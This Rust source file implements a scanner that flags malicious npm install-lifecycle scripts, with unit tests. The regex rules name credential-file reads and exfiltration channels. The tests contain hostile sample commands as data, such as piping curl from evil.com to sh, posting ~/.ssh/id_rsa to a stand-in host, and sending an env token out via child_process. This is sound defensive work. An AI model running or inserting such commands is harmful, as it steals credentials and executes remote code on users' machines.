//! P0 rule set #1: lifecycle-script body inspection.
//!
//! npm's `preinstall` / `install` / `postinstall` / `prepare` scripts
//! run with full user privileges during a normal `npm install`. That's
//! the single most common exfil vector in recent supply-chain attacks
//! (Shai-Hulud, SANDWORM_MODE, the 2024-2026 typosquat waves).
//!
//! `perry install` always runs the underlying installer with
//! `--ignore-scripts`, so these strings have NOT been executed by the
//! time this rule runs. We scan them statically and refuse to permit
//! the script to run later (Phase 9) if any of these signals fire.

use regex::Regex;
use std::sync::OnceLock;

use super::report::{Finding, Severity};
use super::ScannedPackage;

const LIFECYCLE_KEYS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];

/// Patterns we treat as P0 signals. Each entry is `(rule_id, regex, message)`.
/// Regexes are case-insensitive; bodies are matched as a single string.
fn rules() -> &'static [(&'static str, &'static Regex, &'static str)] {
    static RULES: OnceLock<Vec<(&'static str, &'static Regex, &'static str)>> = OnceLock::new();
    RULES.get_or_init(|| {
        let mut v: Vec<(&'static str, &'static Regex, &'static str)> = Vec::new();
        // (id, raw pattern, message). Compiled below.
        let raw: &[(&str, &str, &str)] = &[
            (
                "lifecycle-shell-pipe-exec",
                // curl/wget piped to a shell or interpreter — classic
                // `curl evil.com/x | sh` exfil/dropper.
                r"(?i)\b(curl|wget|fetch)\b[^|;\n]{0,400}\|\s*(sh|bash|zsh|node|python3?|perl|ruby)\b",
                "shell pipe-to-interpreter pattern (curl|wget … | sh/bash/node)",
            ),
            (
                "lifecycle-base64-eval",
                // eval(atob(…)) or Function(atob(…)) or
                // Function(Buffer.from(…, 'base64')…) — decode-and-eval
                // chain, near-universal in obfuscated droppers.
                r"(?i)(\beval\s*\(|\bnew\s+Function\s*\(|\bFunction\s*\()[^)]{0,200}\b(atob|Buffer\.from)\b",
                "decode-and-eval chain (eval/Function combined with atob/Buffer.from)",
            ),
            (
                "lifecycle-ssh-read",
                r"(?i)(\$HOME|~|\.\./)?(/?\.ssh/)|process\.env\.HOME[^)]{0,40}\.ssh",
                "reads SSH keys (~/.ssh / $HOME/.ssh)",
            ),
            (
                "lifecycle-aws-read",
                r"(?i)(\$HOME|~)/\.aws\b|process\.env\.HOME[^)]{0,40}\.aws",
                "reads AWS credentials (~/.aws)",
            ),
            (
                "lifecycle-npmrc-read",
                r"(?i)(\$HOME|~)/\.npmrc\b|process\.env\.HOME[^)]{0,40}\.npmrc",
                "reads ~/.npmrc (often contains npm publish tokens)",
            ),
            (
                "lifecycle-gh-config-read",
                r"(?i)(\$HOME|~)/\.config/gh\b",
                "reads ~/.config/gh (GitHub CLI auth tokens)",
            ),
            (
                "lifecycle-token-env-read",
                // Reads of env vars that match secret-like names.
                r"(?i)process\.env\s*\.\s*[A-Z_]*(TOKEN|SECRET|KEY|PASSWORD|API_?KEY|ACCESS)[A-Z_]*\b",
                "reads secret-looking env variable from a lifecycle script",
            ),
            (
                "lifecycle-ioc-discord-webhook",
                r"(?i)discord(app)?\.com/api/webhooks/",
                "Discord webhook URL in a lifecycle script (known exfil channel)",
            ),
            (
                "lifecycle-ioc-telegram-bot",
                r"(?i)api\.telegram\.org/bot",
                "Telegram bot API URL in a lifecycle script (known exfil channel)",
            ),
            (
                "lifecycle-ioc-collaborator",
                r"(?i)burpcollaborator\.net|oast\.(pro|me|fun|live|site)|interactsh",
                "out-of-band collaborator / interactsh domain in a lifecycle script",
            ),
            (
                "lifecycle-ioc-ip-host",
                // Outbound to a bare IP literal — almost never legitimate
                // inside an install script.
                r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
                "outbound HTTP(S) to a bare IP literal",
            ),
            (
                "lifecycle-child-process-dyn",
                // child_process.exec / spawn / execSync with a template
                // literal or string concatenation containing an env read
                // — the canonical "exfil via shell" pattern.
                r"child_process[^;]{0,80}(exec|spawn)(Sync)?\s*\([^)]*process\.env",
                "child_process call whose argument reads process.env",
            ),
        ];
        for (id, pat, msg) in raw {
            // Compile + leak so the &'static Regex lives forever; this
            // path runs at most once per process.
            let r = Regex::new(pat).expect("hardcoded scanner regex compiles");
            let boxed: &'static Regex = Box::leak(Box::new(r));
            v.push((id, boxed, msg));
        }
        v
    })
}

pub fn check(pkg: &ScannedPackage) -> Vec<Finding> {
    let scripts = match pkg.manifest.get("scripts").and_then(|v| v.as_object()) {
        Some(m) => m,
        None => return Vec::new(),
    };

    let mut findings = Vec::new();
    for key in LIFECYCLE_KEYS {
        let body = match scripts.get(*key).and_then(|v| v.as_str()) {
            Some(b) => b,
            None => continue,
        };
        for (rule_id, regex, message) in rules() {
            if regex.is_match(body) {
                findings.push(Finding {
                    package: format!("{}@{}", pkg.name, pkg.version),
                    package_path: pkg.dir.display().to_string(),
                    severity: Severity::P0,
                    rule: (*rule_id).to_string(),
                    message: format!("lifecycle '{}': {}", key, message),
                    location: Some(format!("package.json (scripts.{})", key)),
                    overridden: false,
                });
            }
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::path::PathBuf;

    fn pkg_with_scripts(scripts: serde_json::Value) -> ScannedPackage {
        ScannedPackage {
            name: "test".into(),
            version: "0.0.0".into(),
            dir: PathBuf::from("/tmp/test"),
            manifest: json!({ "name": "test", "version": "0.0.0", "scripts": scripts }),
        }
    }

    #[test]
    fn flags_curl_pipe_sh() {
        let p = pkg_with_scripts(json!({ "postinstall": "curl evil.com/x | sh" }));
        let f = check(&p);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].rule, "lifecycle-shell-pipe-exec");
    }

    #[test]
    fn flags_wget_pipe_bash() {
        let p = pkg_with_scripts(json!({ "preinstall": "wget -qO- http://x | bash" }));
        assert_eq!(check(&p).len(), 1);
    }

    #[test]
    fn flags_eval_atob() {
        let p = pkg_with_scripts(json!({
            "install": "node -e 'eval(atob(\"Y29uc29sZS5sb2coMSk=\"))'"
        }));
        let f = check(&p);
        assert!(f.iter().any(|f| f.rule == "lifecycle-base64-eval"));
    }

    #[test]
    fn flags_buffer_from_eval() {
        let p = pkg_with_scripts(json!({
            "postinstall": "node -e 'new Function(Buffer.from(payload, \"base64\").toString())()'"
        }));
        assert!(check(&p).iter().any(|f| f.rule == "lifecycle-base64-eval"));
    }

    #[test]
    fn flags_ssh_path_read() {
        let p = pkg_with_scripts(json!({ "postinstall": "cat ~/.ssh/id_rsa | curl -X POST evil" }));
        assert!(check(&p).iter().any(|f| f.rule == "lifecycle-ssh-read"));
    }

    #[test]
    fn flags_aws_path_read() {
        let p = pkg_with_scripts(json!({ "postinstall": "tar czf /tmp/x.tgz ~/.aws/" }));
        assert!(check(&p).iter().any(|f| f.rule == "lifecycle-aws-read"));
    }

    #[test]
    fn flags_npmrc_read() {
        let p = pkg_with_scripts(json!({ "postinstall": "cat $HOME/.npmrc" }));
        assert!(check(&p).iter().any(|f| f.rule == "lifecycle-npmrc-read"));
    }

    #[test]
    fn flags_token_env_read() {
        let p = pkg_with_scripts(json!({
            "postinstall": "node -e 'console.log(process.env.NPM_TOKEN)'"
        }));
        assert!(check(&p)
            .iter()
            .any(|f| f.rule == "lifecycle-token-env-read"));
    }

    #[test]
    fn flags_discord_webhook() {
        let p = pkg_with_scripts(json!({
            "install": "curl -d @data https://discord.com/api/webhooks/123/abc"
        }));
        let rules: Vec<_> = check(&p).into_iter().map(|f| f.rule).collect();
        assert!(rules.contains(&"lifecycle-ioc-discord-webhook".to_string()));
    }

    #[test]
    fn flags_ip_literal_host() {
        let p = pkg_with_scripts(json!({
            "postinstall": "curl http://192.168.1.1/x.sh"
        }));
        assert!(check(&p).iter().any(|f| f.rule == "lifecycle-ioc-ip-host"));
    }

    #[test]
    fn flags_child_process_env_exec() {
        let p = pkg_with_scripts(json!({
            "postinstall": "node -e 'require(\"child_process\").exec(`curl evil?t=${process.env.TOKEN}`)'"
        }));
        assert!(check(&p)
            .iter()
            .any(|f| f.rule == "lifecycle-child-process-dyn"));
    }

    #[test]
    fn clean_scripts_no_findings() {
        let p = pkg_with_scripts(json!({
            "postinstall": "node ./scripts/build.js",
            "prepare": "tsc"
        }));
        assert!(check(&p).is_empty());
    }

    #[test]
    fn no_scripts_section_no_findings() {
        let p = ScannedPackage {
            name: "n".into(),
            version: "0".into(),
            dir: PathBuf::from("/t"),
            manifest: json!({ "name": "n", "version": "0" }),
        };
        assert!(check(&p).is_empty());
    }

    #[test]
    fn non_lifecycle_script_ignored() {
        // "build" isn't an install-lifecycle script and shouldn't be scanned.
        let p = pkg_with_scripts(json!({ "build": "curl evil.com/x | sh" }));
        assert!(check(&p).is_empty());
    }
}
